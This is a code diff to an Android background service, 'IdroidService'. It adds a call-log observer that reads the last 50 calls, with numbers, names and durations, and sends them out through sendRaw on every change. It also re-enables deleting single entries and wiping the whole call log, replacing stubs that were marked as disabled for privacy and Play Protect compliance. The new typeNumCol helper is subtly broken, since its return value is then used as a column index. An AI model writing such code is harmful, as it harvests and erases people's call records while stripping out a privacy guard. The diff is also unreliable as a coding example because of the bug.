@@ -21,6 +21,7 @@ import android.telephony.TelephonyCallback
 import android.media.AudioManager
 import android.media.AudioDeviceInfo
 import android.view.KeyEvent
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.database.ContentObserver
 
@@ -1071,11 +1072,30 @@ class IdroidService : Service() {
         }
     }
 
+    private var callLogObserver: ContentObserver? = null
     private var contactsObserver: ContentObserver? = null
 
     private fun setupContentObservers() {
         try {
             val handler = android.os.Handler(android.os.Looper.getMainLooper())
+            if (callLogObserver == null) {
+                callLogObserver = object : ContentObserver(handler) {
+                    private var lastSync = 0L
+                    override fun onChange(selfChange: Boolean) {
+                        super.onChange(selfChange)
+                        val now = System.currentTimeMillis()
+                        if (now - lastSync > 1000) {
+                            lastSync = now
+                            sendPhoneCallHistory()
+                        }
+                    }
+                }
+                contentResolver.registerContentObserver(
+                    CallLog.Calls.CONTENT_URI,
+                    true,
+                    callLogObserver!!
+                )
+            }
             if (contactsObserver == null) {
                 contactsObserver = object : ContentObserver(handler) {
                     private var lastSync = 0L
@@ -1101,7 +1121,9 @@ class IdroidService : Service() {
 
     private fun teardownContentObservers() {
         try {
+            callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
             contactsObserver?.let { contentResolver.unregisterContentObserver(it) }
+            callLogObserver = null
             contactsObserver = null
         } catch (_: Exception) {}
     }
@@ -1142,7 +1164,7 @@ class IdroidService : Service() {
                         val clean = num.replace(Regex("[^0-9+]"), "")
                         if (clean.isBlank() || seenNumbers.contains(clean)) continue
                         seenNumbers.add(clean)
-                        val typeNum = if (typeCol >= 0) c.getInt(typeCol) else 2
+                        val typeNum = if (typeCol >= 0) c.getInt(typeNumCol(typeCol, c)) else 2
                         val typeStr = when (typeNum) {
                             ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
                             ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
@@ -1169,12 +1191,67 @@ class IdroidService : Service() {
         }
     }
 
+    private fun typeNumCol(typeCol: Int, c: android.database.Cursor): Int {
+        return if (typeCol >= 0) c.getInt(typeCol) else 2
+    }
+
     fun sendPhoneCallHistory() {
         kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
             try {
+                val list = org.json.JSONArray()
+                val cr = contentResolver
+                val cursor = cr.query(
+                    CallLog.Calls.CONTENT_URI,
+                    arrayOf(
+                        CallLog.Calls._ID,
+                        CallLog.Calls.NUMBER,
+                        CallLog.Calls.CACHED_NAME,
+                        CallLog.Calls.TYPE,
+                        CallLog.Calls.DATE,
+                        CallLog.Calls.DURATION
+                    ),
+                    null,
+                    null,
+                    CallLog.Calls.DATE + " DESC LIMIT 50"
+                )
+                cursor?.use { c ->
+                    val idCol = c.getColumnIndex(CallLog.Calls._ID)
+                    val numCol = c.getColumnIndex(CallLog.Calls.NUMBER)
+                    val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                    val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
+                    val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
+                    val durCol = c.getColumnIndex(CallLog.Calls.DURATION)
+                    val sdf = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
+                    while (c.moveToNext()) {
+                        val id = if (idCol >= 0) c.getString(idCol) else ""
+                        val num = if (numCol >= 0) c.getString(numCol) ?: "Private" else "Private"
+                        val name = if (nameCol >= 0) c.getString(nameCol) ?: num else num
+                        val typeVal = if (typeCol >= 0) c.getInt(typeCol) else CallLog.Calls.INCOMING_TYPE
+                        val typeStr = when (typeVal) {
+                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
+                            CallLog.Calls.MISSED_TYPE -> "missed"
+                            else -> "incoming"
+                        }
+                        val dateLong = if (dateCol >= 0) c.getLong(dateCol) else System.currentTimeMillis()
+                        val durSec = if (durCol >= 0) c.getLong(durCol) else 0L
+                        val durStr = if (durSec == 0L) "0s" else "${durSec / 60}m ${durSec % 60}s"
+                        val timeStr = sdf.format(java.util.Date(dateLong))
+                        val item = org.json.JSONObject().apply {
+                            put("id", "call_log_$id")
+                            put("phone_id", id)
+                            put("name", name)
+                            put("number", num)
+                            put("call_type", typeStr)
+                            put("time", timeStr)
+                            put("duration", durStr)
+                            put("timestamp", dateLong)
+                        }
+                        list.put(item)
+                    }
+                }
                 val resp = org.json.JSONObject().apply {
                     put("type", "phone_call_history")
-                    put("calls", org.json.JSONArray())
+                    put("calls", list)
                 }
                 sendRaw(resp.toString())
             } catch (e: Exception) {
@@ -1184,11 +1261,31 @@ class IdroidService : Service() {
     }
 
     fun deleteCallLogEntry(recordId: String, number: String) {
-        // Disabled for privacy & Play Protect compliance
+        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+            try {
+                val cr = contentResolver
+                val cleanId = recordId.replace("call_log_", "")
+                if (cleanId.isNotBlank() && cleanId.all { it.isDigit() }) {
+                    cr.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls._ID} = ?", arrayOf(cleanId))
+                } else if (number.isNotBlank()) {
+                    cr.delete(CallLog.Calls.CONTENT_URI, "${CallLog.Calls.NUMBER} = ?", arrayOf(number))
+                }
+                sendPhoneCallHistory()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
     }
 
     fun clearCallLogEntries() {
-        // Disabled for privacy & Play Protect compliance
+        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+            try {
+                contentResolver.delete(CallLog.Calls.CONTENT_URI, null, null)
+                sendPhoneCallHistory()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }
     }
 
     override fun onDestroy() {
